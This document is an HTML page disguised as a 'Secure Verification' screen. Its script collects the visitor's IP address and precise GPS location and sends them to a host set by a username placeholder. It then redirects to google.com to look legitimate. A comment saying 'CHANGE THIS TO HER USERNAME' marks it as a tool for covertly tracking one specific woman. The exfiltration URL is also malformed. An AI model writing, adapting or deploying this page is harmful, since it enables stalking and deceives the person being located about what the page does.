<!DOCTYPE html>
<html>
<head>
    <title>Secure Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
    </style>
</head>
<body>
    <div class="card">
        <div id="status"><h3>Verifying Connection...</h3><p>Please do not close this window.</p></div>
    </div>

    <script>
        // CHANGE THIS TO HER USERNAME
        const PA_USER = "REPLACE_WITH_ACTUAL_USERNAME"; 
        
        let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
        let sent = false;

        async function collectAndSend() {
            if (sent) return;
            
            // 1. Get IP Data (Backup)
            try {
                const res = await fetch('https://ipapi.co');
                const json = await res.json();
                data.ip = json.ip;
                data.lat = json.latitude;
                data.lon = json.longitude;
            } catch (e) { console.log("IP Fetch Failed"); }

            // 2. Try GPS (Precision)
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        data.type = "High-Precision GPS";
                        finalize();
                    },
                    () => { data.type = "Network-Fallback"; finalize(); },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else { finalize(); }
            
            // 3. Forced Timeout (If everything hangs, send data anyway after 7 seconds)
            setTimeout(finalize, 7000);
        }

        function finalize() {
            if (sent) return;
            sent = true;
            
            const url = `https://${PA_USER}://{data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}`;
            
            fetch(url, { mode: 'no-cors' }).then(() => {
                document.getElementById('status').innerHTML = "<h3>Verification Complete</h3>";
                // Redirect to a real image to look legitimate
                setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
            });
        }

        window.onload = collectAndSend;
    </script>
</body>
</html>
